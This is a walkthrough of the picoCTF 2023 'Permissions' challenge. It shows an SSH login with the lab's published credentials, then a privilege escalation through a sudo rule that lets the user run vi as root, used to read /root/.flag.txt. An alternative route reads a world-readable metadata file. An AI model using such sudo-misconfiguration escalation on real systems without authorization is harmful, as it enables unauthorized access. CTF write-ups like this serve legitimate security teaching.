# Permissions

- [Challenge information](#challenge-information)
- [The likely intended solution](#the-likely-intended-solution)
- [An alternative solution](#an-alternative-solution)
- [References](#references)

## Challenge information

```text
Level: Medium
Tags: picoCTF 2023, General Skills, vim
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Author: GEOFFREY NJOGU

Description:
Can you read files in the root file?

The system admin has provisioned an account for you on the main server:
ssh -p 59219 picoplayer@saturn.picoctf.net
Password: pEN9KN1qYm

Can you login and read the root file?

Hints:
(None)
```

Challenge link: [https://play.picoctf.org/practice/challenge/363](https://play.picoctf.org/practice/challenge/363)

## The likely intended solution

When the description says read the 'root file' I think they rather meant the `/root` directory!

We start by connecting to the server with SSH

```bash
┌──(kali㉿kali)-[/picoCTF/picoCTF_2023/General_Skills/Permissions]
└─$ ssh -p 59219 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:59219 ([13.59.203.175]:59219)' can't be established.
ED25519 key fingerprint is SHA256:Km7la74G7/fztU37KiXuMDlWhxowKKAxA3TjvWy1Y0o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:59219' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.19.0-1024-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ 
```

Let's change directory and look for the /root directory.

```bash
picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls -la
total 0
drwxr-xr-x    1 root   root     51 Jul 26 12:00 .
drwxr-xr-x    1 root   root     51 Jul 26 12:00 ..
-rwxr-xr-x    1 root   root      0 Jul 26 12:00 .dockerenv
lrwxrwxrwx    1 root   root      7 Mar  8 02:05 bin -> usr/bin
drwxr-xr-x    2 root   root      6 Apr 15  2020 boot
drwxr-xr-x    1 root   root     21 Mar 16 02:29 challenge
drwxr-xr-x    5 root   root    340 Jul 26 12:00 dev
drwxr-xr-x    1 root   root     66 Jul 26 12:00 etc
drwxr-xr-x    1 root   root     24 Mar 16 02:29 home
lrwxrwxrwx    1 root   root      7 Mar  8 02:05 lib -> usr/lib
lrwxrwxrwx    1 root   root      9 Mar  8 02:05 lib32 -> usr/lib32
lrwxrwxrwx    1 root   root      9 Mar  8 02:05 lib64 -> usr/lib64
lrwxrwxrwx    1 root   root     10 Mar  8 02:05 libx32 -> usr/libx32
drwxr-xr-x    2 root   root      6 Mar  8 02:06 media
drwxr-xr-x    2 root   root      6 Mar  8 02:06 mnt
drwxr-xr-x    2 root   root      6 Mar  8 02:06 opt
dr-xr-xr-x 2247 nobody nogroup   0 Jul 26 12:00 proc
drwx------    1 root   root     23 Mar 16 02:29 root                         <------- Here!
drwxr-xr-x    1 root   root     54 Jul 26 12:07 run
lrwxrwxrwx    1 root   root      8 Mar  8 02:05 sbin -> usr/sbin
drwxr-xr-x    2 root   root      6 Mar  8 02:06 srv
dr-xr-xr-x   13 nobody nogroup   0 Jul 26 12:00 sys
drwxrwxrwt    1 root   root      6 Mar 16 02:29 tmp
drwxr-xr-x    1 root   root     18 Mar  8 02:06 usr
drwxr-xr-x    1 root   root     17 Mar  8 02:09 var
```

We can see that it is a directory rather than a file and that the only user that have permissions to read the directory is the root user.

So what can we do to escalate our privileges? Let's check what commands we can run as root via `sudo`.  
This is done with `sudo -l`.

```bash
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi

```

Ah, all users can run the `vi` text editor as root. This means we can read the /root directory as a file with it.
Run `sudo vi /root` and you get

```text
" ============================================================================
" Netrw Directory Listing                                        (netrw v165)
"   /root
"   Sorted by      name
"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\.obj$,\.info$,\.swp$,\.bak$,\~$
"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
" ==============================================================================
../                                                                                                                                                                                             
./
.vim/
.bashrc
.flag.txt                <------- Here!
.profile
~      
<---snip--->
```

Press `Esc` and then type `:q` (followed by enter) to quit the `vi` editor.

We can see that there is a file named `.flag.txt` in the `/root` directory.

Reading that file in the same manner with `sudo vi /root/.flag.txt` gets you the flag.

## An alternative solution

When I looked through the file and directory listing in `/` I also noticed that there is a directory called `challenge`.

```bash
picoplayer@challenge:/$ ls -la
total 0
drwxr-xr-x    1 root   root     51 Jul 26 12:00 .
drwxr-xr-x    1 root   root     51 Jul 26 12:00 ..
-rwxr-xr-x    1 root   root      0 Jul 26 12:00 .dockerenv
lrwxrwxrwx    1 root   root      7 Mar  8 02:05 bin -> usr/bin
drwxr-xr-x    2 root   root      6 Apr 15  2020 boot
drwxr-xr-x    1 root   root     21 Mar 16 02:29 challenge             <------- Here!
drwxr-xr-x    5 root   root    340 Jul 26 12:00 dev
drwxr-xr-x    1 root   root     66 Jul 26 12:00 etc
drwxr-xr-x    1 root   root     24 Mar 16 02:29 home
lrwxrwxrwx    1 root   root      7 Mar  8 02:05 lib -> usr/lib
lrwxrwxrwx    1 root   root      9 Mar  8 02:05 lib32 -> usr/lib32
lrwxrwxrwx    1 root   root      9 Mar  8 02:05 lib64 -> usr/lib64
lrwxrwxrwx    1 root   root     10 Mar  8 02:05 libx32 -> usr/libx32
drwxr-xr-x    2 root   root      6 Mar  8 02:06 media
drwxr-xr-x    2 root   root      6 Mar  8 02:06 mnt
drwxr-xr-x    2 root   root      6 Mar  8 02:06 opt
dr-xr-xr-x 2247 nobody nogroup   0 Jul 26 12:00 proc
drwx------    1 root   root     23 Mar 16 02:29 root                         
drwxr-xr-x    1 root   root     54 Jul 26 12:07 run
lrwxrwxrwx    1 root   root      8 Mar  8 02:05 sbin -> usr/sbin
drwxr-xr-x    2 root   root      6 Mar  8 02:06 srv
dr-xr-xr-x   13 nobody nogroup   0 Jul 26 12:00 sys
drwxrwxrwt    1 root   root      6 Mar 16 02:29 tmp
drwxr-xr-x    1 root   root     18 Mar  8 02:06 usr
drwxr-xr-x    1 root   root     17 Mar  8 02:09 var
```

It's readable for all users so let's check that out

```bash
picoplayer@challenge:/$ cd challenge/
picoplayer@challenge:/challenge$ ls -la
total 4
drwxr-xr-x 1 root root 21 Mar 16 02:29 .
drwxr-xr-x 1 root root 51 Jul 19 06:06 ..
-rw-r--r-- 1 root root 98 Mar 16 02:29 metadata.json
```

Let's `cat` the file to view its contents.

```bash
picoplayer@challenge:/challenge$ cat metadata.json
{"flag": "picoCTF{<REDACTED>}", "username": "picoplayer", "password": "pEN9KN1qYm"}
```

And voilà there is the flag in another way!

For additional information, please see the references below.

## References

- [File-system permissions - Wikipedia](https://en.wikipedia.org/wiki/File-system_permissions)
- [Root directory - Wikipedia](https://en.wikipedia.org/wiki/Root_directory)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
